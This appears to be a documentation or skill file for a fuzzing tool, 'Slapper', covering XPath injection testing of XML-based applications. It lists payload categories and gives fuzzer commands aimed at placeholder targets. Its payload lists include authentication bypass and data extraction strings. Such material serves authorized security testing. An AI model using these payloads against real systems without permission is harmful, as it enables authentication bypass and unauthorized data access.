---
name: xpath_injection
description: "XPath injection testing for XML-based applications"
triggers:
  - xpath injection
  - xml injection
  - xpath fuzzing
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: web_targets
---

## Overview

Slapper supports XPath injection testing for applications that use XML databases or process XML data. XPath injection can lead to unauthorized data access or authentication bypass.

## Payload Categories

| Category | Count | Examples |
|----------|-------|----------|
| Basic Injection | 7+ | `' or '1'='1`, comment injection |
| Union-based | 5+ | `'] | //user | '` |
| Boolean-based | 6+ | `' and 1=1 or '` |
| Error-based | 3+ | `']/child::node()/` |
| Comment-based | 5+ | `']/*[1]/*/text()]` |
| Functions | 7+ | `string-length()`, `substring()` |
| Bypass | 5+ | Quotes, brackets, normalization |

## Usage

```bash
# Basic XPath injection scan
slapper fuzzer --target http://target.com/xml --payload-type xpath

# Target XML endpoint
slapper fuzzer --target http://target.com/api/xml/parse --payload-type xpath
```

## Injection Techniques

### Basic Authentication Bypass
```
' or '1'='1
' or ''='
admin' or '1'='1
```

### Data Extraction
```
'] | //user | ']
']//user[@id=1]/text()
```

### Error-Based Extraction
```
']/child::node()[last()-1]/text()
```

## Triggers

Keywords: xpath injection, xml injection, xpath fuzzing, xml database, xpath-based authentication

## References

- `fuzzer/payloads/xpath.rs` - Payload implementations
- `PayloadType::Xpath` - Integration point
